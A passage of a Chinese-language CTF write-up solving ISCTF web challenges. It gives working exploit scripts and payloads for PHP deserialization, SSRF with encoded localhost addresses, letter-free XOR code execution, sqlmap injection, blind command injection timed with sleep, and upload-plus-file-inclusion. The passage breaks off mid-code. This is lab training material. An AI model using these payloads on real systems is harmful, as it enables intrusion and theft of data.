class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$num</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="variable">$num</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$num</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">127</span>; <span class="variable">$i</span>++) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="string">&#x27;36&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) <span class="keyword">and</span> <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> <span class="keyword">and</span> <span class="title function_ invoke__">filter</span>(<span class="variable">$num</span>)==<span class="string">&#x27;36&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Payload:<code>http://120.79.18.34:20545/?str=\\\\\\\\/Ilikeisctf&amp;num=36%0C&amp;cmd=system(&#39;cat /flag&#39;);</code></p><p>ISCTF{59551edf-ece1-4878-a4a8-7d10e0dbfb19}</p><h2 id="猫和老鼠"><a href="#猫和老鼠" class="headerlink" title="猫和老鼠"></a>猫和老鼠</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Good. You caught the mouse:&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dog</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dog</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;I&#x27;m a vicious dog, Kitty&quot;</span>;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cat&quot;</span>]); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化</p><p>这个题目就是一个反序列化加一个php伪协议的利用。 利用include执行php伪协议造成文件读取 主要是绕过在执行析构函数的时候绕过dog会把cat内的a属性给变成I’m a vicious dog, Kitty 利用引用绕过</p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mouse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = &amp;<span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$abc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cat</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$abc</span>);</span><br></pre></td></tr></table></figure><p>解释一下<code>$this-&gt;b = &amp;$this-&gt;a;</code>中&amp;是取地址符号，意思是b将指向a的地址空间，这时a和b都是指向同一个地址空间，给b赋值就相当于给a赋值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:cat=O:3:%22cat%22:3&#123;s:1:%22a%22;N;s:1:%22b%22;R:2;s:1:%22c%22;O:5:%22mouse%22:1&#123;s:1:%22v%22;s:52:%22php://filter/convert.base64-encode/resource=flag.php%22;&#125;&#125;</span><br></pre></td></tr></table></figure><p>base64解码一下即可。</p><p>ISCTF{c98bfcc5-5688-4c9f-b11a-b61f3ff01b9f}</p><h2 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h2><p>这里有个this可以点击，然后提示让我们从本地访问，可以看到flag在www目录下。</p><p><img src="https://s2.loli.net/2023/08/04/2XJlHROuPGkwpFj.png" alt="image-20221105222032500.png"></p><p>看源码，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;urls&#x27;]))&#123;</span><br><span class="line">$urls = $_GET[&#x27;urls&#x27;];</span><br><span class="line">$url_host = parse_url($urls,PHP_URL_HOST);</span><br><span class="line">//Do something~~~~</span><br><span class="line">curl_get($urls);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>意思是让我们传一个url地址，一道ssrf。</p><p>先尝试<code>?urls=http://127.0.0.1/flag.php</code>发现被过滤了，localhost也不行。</p><p><img src="https://s2.loli.net/2023/08/04/QjOwrS8kZYc4WIv.png" alt="image-20221105222956977.png"></p><p>尝试把127.0.0.1转化为其他进制试试看（也是能访问的）</p><blockquote><p>2130706433 10进制 <a href="http://2130706433">http://2130706433</a><br>017700000001 8进制 <a href="http://017700000001">http://017700000001</a><br>7F000001 16进制 <a href="http://0x7F000001">http://0x7F000001</a></p></blockquote><p>尝试10进制可以,<code>?urls=http://2130706433/flag.php</code></p><p>还有一种解法，看到注释里Do something~~~~就是对urls做了些处理，php里并没有curl_get函数，parse_url对url进行了分割。那么可以可以猜测curl_get函数是获得资源的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.18.34:20010/?urls=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><p>ISCTF{c706d632-5edf-4c4b-bf52-a3676c8411d9}</p><h2 id="rce？"><a href="#rce？" class="headerlink" title="rce？"></a>rce？</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">var_dump</span>(<span class="keyword">eval</span>(<span class="variable">$code</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;你能拿到flag吗？&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正则过滤了数字和字母，很明显无数字字母rce。</p><p>exp.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=&quot;tac /f*&quot;;</span><br><span class="line">echo &quot;(\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%&quot;.dechex(ord($a[$i])^0xff);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;^\&quot;&quot;;</span><br><span class="line">for ($i=0; $i &lt; strlen($a); $i++) &#123; </span><br><span class="line">    echo &quot;%ff&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\&quot;)&quot;;</span><br></pre></td></tr></table></figure><p>Payload:<code>?shell=(&quot;%8c%86%8c%8b%9a%92&quot;^&quot;%ff%ff%ff%ff%ff%ff&quot;)(&quot;%8b%9e%9c%df%d0%99%d5&quot;^&quot;%ff%ff%ff%ff%ff%ff%ff&quot;);</code></p><p>ISCTF{11bdd027-5e99-4e21-b066-02dc1c125724}</p><h2 id="傻注"><a href="#傻注" class="headerlink" title="傻注"></a>傻注</h2><p>找一下登录界面login.php</p><p><img src="https://s2.loli.net/2023/08/04/wIVkh6aFc7uSp8Y.png" alt="04c21f4583e14b4f9069deccc6f4d4d8.png"></p><p>根据题目猜测，这是一道sql注入的题目</p><p>burp suit简单扫一下，发现存在ua注入，直接sqlmap一把梭</p><p>查看数据库<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 --dbs</code></p><p><img src="https://s2.loli.net/2023/08/04/OAn6hJuBWV4wGQC.png" alt="4b8a9a503af6421ab11c8905eda0dff1.png"></p><p>查看表<br><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf --tables</code></p><p><img src="https://s2.loli.net/2023/08/04/4wOi3FytCPSHx8f.png" alt="c7ec92e83c96491aab2452445047b15f.png"></p><p>查看user_agents内容</p><p><code>sqlmap -u http://120.79.18.34:20387/login.php --level 3 -D ctf -T user_agents --columns --dump</code></p><p><img src="https://s2.loli.net/2023/08/04/pnYeAkLmrZaSDBc.png" alt="b5c59d4a63654969a7bb6f5c0320d79a.png"></p><p>得到flag</p><h2 id="easy-onlineshell"><a href="#easy-onlineshell" class="headerlink" title="easy-onlineshell"></a>easy-onlineshell</h2><p>提示我们先扫描一下，dirsearch扫描后发现www.zip源码泄露。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import flask</span><br><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line">app = flask.<span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Try to access the /rce&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/www.zip&quot;</span>)</span><br><span class="line">def <span class="title function_ invoke__">return_SourceCode</span>():</span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&quot;./app.py&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_ invoke__">read</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&quot;/rce&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>])</span><br><span class="line">def <span class="title function_ invoke__">action_rce</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Why not try to search the backup&quot;</span></span><br><span class="line">    elif flask.request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        action = flask.request.form[<span class="string">&quot;act&quot;</span>]</span><br><span class="line">        with <span class="title function_ invoke__">open</span>(<span class="string">&quot;/app/temp.sh&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.<span class="title function_ invoke__">write</span>(action[<span class="number">1</span>:-<span class="number">1</span>])</span><br><span class="line">        res = subprocess.<span class="title function_ invoke__">run</span>([<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/app/temp.sh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">        <span class="comment"># print(res)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(debug=True)</span><br></pre></td></tr></table></figure><p>分析代码发现是在/rce这个路由情况下就可以通过POST传入参数act，然后传入的内容的首位和末位都会被裁剪，然后再执行传入的参数。 所以这个题目可以采用命令盲注，利用sleep来注入（备注：题目提示无回显shell，尝试反弹shell、dnslog都失败，感觉这题无回显不出网，可能这个靶机是不连外网的。）</p><p>采用命令盲注，利用sleep来注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://120.79.18.34:20650/rce&quot;</span></span><br><span class="line"></span><br><span class="line">strs = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">dics = <span class="string">&quot;abcdefgh ijklmnopqrstuvwxyz&#123;&#125;[].1234567890QAZWSXEDCRFVTGBYHNUJMIKOLP?-&quot;</span></span><br><span class="line"><span class="keyword">for</span> num1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> st <span class="keyword">in</span> dics:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;act&#x27;</span>: <span class="string">&#x27;1a=`cat 1.txt`;if [ &quot;$&#123;&#x27;</span>+<span class="string">&#x27;a:&#123;&#125;:&#x27;</span>.<span class="built_in">format</span>(num1)+<span class="string">&#x27;1&#125;&quot; == &#x27;</span>+<span class="string">&#x27;&quot;&#123;&#125;&quot; ];then sleep 2;fi1&#x27;</span>.<span class="built_in">format</span>(st)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(num1)</span><br><span class="line">            strs = strs+st</span><br><span class="line">            <span class="built_in">print</span>(strs)</span><br><span class="line"><span class="built_in">print</span>(strs)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/5rqj1YdHnRFzGhc.png" alt="image-20221106155842877.png">)</p><h2 id="crazy-onlineshell"><a href="#crazy-onlineshell" class="headerlink" title="crazy-onlineshell"></a>crazy-onlineshell</h2><p>在easy-onlineshell基础上加了些过滤，同款脚本也能跑。</p><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>目录扫一下找到www.rar</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在文件包含漏洞，结合文件上传，可以上传一个jpg然后利用这个包含，上传文件如下：</p><p>先上传个php文件把Content-Type: application/octet-stream</p><p>改成image/jpeg，发现还是非法文件，说明文件本身也有验证。那么传入：</p><p><img src="https://s2.loli.net/2023/08/04/kL1RgqyB7cVsIdm.png" alt="image-20221108092202957.png"></p><p>把后缀命改成jpg后上传，再包含它即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload:http://120.79.18.34:20635/?file=uplO4d/exp.jpg</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/04/aERSGHOLwXFKV3P.png" alt="image-20221108092327637.png"></p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ext = <span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;ext, <span class="variable">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">move</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span 